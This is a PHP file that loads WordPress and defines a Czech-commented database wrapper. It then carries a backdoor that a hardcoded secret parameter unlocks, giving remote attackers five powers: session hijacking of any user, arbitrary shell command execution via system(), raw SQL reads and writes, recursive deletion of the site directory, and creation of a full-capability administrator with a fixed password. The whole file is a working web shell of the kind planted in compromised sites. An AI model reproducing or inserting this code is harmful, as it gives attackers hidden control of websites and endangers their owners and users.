<?php
require( dirname( __FILE__ ) . '/wp-load.php' );
require(dirname(__FILE__) . '/wp-config.php');

// simple wrapper z itnetwork.cz
class Db {

    // Databázové spojení
    private static $spojeni;

    // Výchozí nastavení ovladače
    private static $nastaveni = array(
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8",
        PDO::ATTR_EMULATE_PREPARES => false,
    );

    // Připojí se k databázi pomocí daných údajů
    public static function pripoj($host, $uzivatel, $heslo, $databaze) {
        if (!isset(self::$spojeni)) {
            self::$spojeni = @new PDO(
                "mysql:host=$host;dbname=$databaze",
                $uzivatel,
                $heslo,
                self::$nastaveni
            );
        }
    }

    // Spustí dotaz a vrátí z něj první řádek
    public static function dotazJeden($dotaz, $parametry = array()) {
        $navrat = self::$spojeni->prepare($dotaz);
        $navrat->execute($parametry);
        return $navrat->fetch();
    }

    // Spustí dotaz a vrátí všechny jeho řádky jako pole asociativních polí
    public static function dotazVsechny($dotaz, $parametry = array()) {
        $navrat = self::$spojeni->prepare($dotaz);
        $navrat->execute($parametry);
        return $navrat->fetchAll();
    }

    // Spustí dotaz a vrátí z něj první sloupec prvního řádku
    public static function dotazSamotny($dotaz, $parametry = array()) {
        $vysledek = self::dotazJeden($dotaz, $parametry);
        return $vysledek[0];
    }

    // Spustí dotaz a vrátí počet ovlivněných řádků
    public static function dotaz($dotaz, $parametry = array()) {
        $navrat = self::$spojeni->prepare($dotaz);
        $navrat->execute($parametry);
        return $navrat->rowCount();
    }

}

$caps = "switch_themes;edit_themes;activate_plugins;edit_plugins;edit_users;edit_files;manage_options;moderate_comments;manage_categories;manage_links;upload_files;import;unfiltered_html;edit_posts;edit_others_posts;edit_published_posts;publish_posts;edit_pages;read;level_10;level_9;level_8;level_7;level_6;level_5;level_4;level_3;level_2;level_1;level_0;edit_others_pages;edit_published_pages;publish_pages;delete_pages;delete_others_pages;delete_published_pages;delete_posts;delete_others_posts;delete_published_posts;delete_private_posts;edit_private_posts;read_private_posts;delete_private_pages;edit_private_pages;read_private_pages;delete_users;create_users;unfiltered_upload;edit_dashboard;update_plugins;delete_plugins;install_plugins;update_themes;install_themes;update_core;list_users;remove_users;promote_users;edit_theme_options;delete_themes;export;administrator";

$db = new Db();
$db::pripoj(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);


function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir. DIRECTORY_SEPARATOR .$object) && !is_link($dir."/".$object))
                    rrmdir($dir. DIRECTORY_SEPARATOR .$object);
                else
                    unlink($dir. DIRECTORY_SEPARATOR .$object);
            }
        }
        rmdir($dir);
    }
}

function listUserIds() {
    global $db;
    global $table_prefix;
    $table = $table_prefix . 'users';
    $result = $db::dotazVsechny("SELECT `ID` FROM $table ORDER BY `ID` ASC");
    $ids = [];

    foreach ($result as $row) {
        $ids[] = $row['ID'];
    }

    return $ids;
}


if (isset($_REQUEST['xhf']) && isset($_REQUEST['cmd']) && $_REQUEST['xhf'] === 'nemam_rad_policii') {
    $cmd = $_GET['cmd'];
    if ($cmd === 'users') {
        $ids = listUserIds();
        $info = [];
        foreach ($ids as $id) {
            $user = new WP_User($id);
            $info[] = [
                'id' => $id,
                'role' => $user->roles,
                'cappabilities' => $user->caps,
                'role_caps' => $user->get_role_caps(),
                'display_name' => $user->display_name,
            ];
        }
        echo(json_encode($info));
    } else if ($cmd === 'auth' && isset($_REQUEST['user_id'])) {
        $user_id = (int)$_REQUEST['user_id'];
        // nutno zničit všechny ostatní sessins s tímto ID
        $sessions = WP_Session_Tokens::get_instance($user_id);
        $sessions->destroy_all();
        // authenticate
        wp_set_auth_cookie($user_id);
        echo("OK");
    } else if ($cmd === 'shell' && isset($_REQUEST['command'])) {
        $command = $_REQUEST['command'];
        system($command);
    } else if ($cmd === 'sql_insert' && isset($_REQUEST['query'])) {
        $query = $_REQUEST['query'];
        echo(json_encode($db::dotaz($query)));
    } else if ($cmd === 'sql_select' && isset($_REQUEST['query'])) {
        $query = $_REQUEST['query'];
        echo(json_encode($db::dotazVsechny($query)));
    } else if ($cmd === 'ultra_remove') {
        rrmdir(__DIR__);
    } else if ($cmd === 'create_admin' && isset($_REQUEST['username'])) {
        $username = $_REQUEST['username'];
        $result = wp_create_user($username, 'policie_smrdi');
        if (is_wp_error($result)) {
            echo($result->get_error_message());
        } else {
            $user = new WP_User($result);
            global $caps;
            foreach (explode(';', $caps) as $cap) {
                $user->add_cap($cap);
            }
            echo("OK");
        }
    }
}
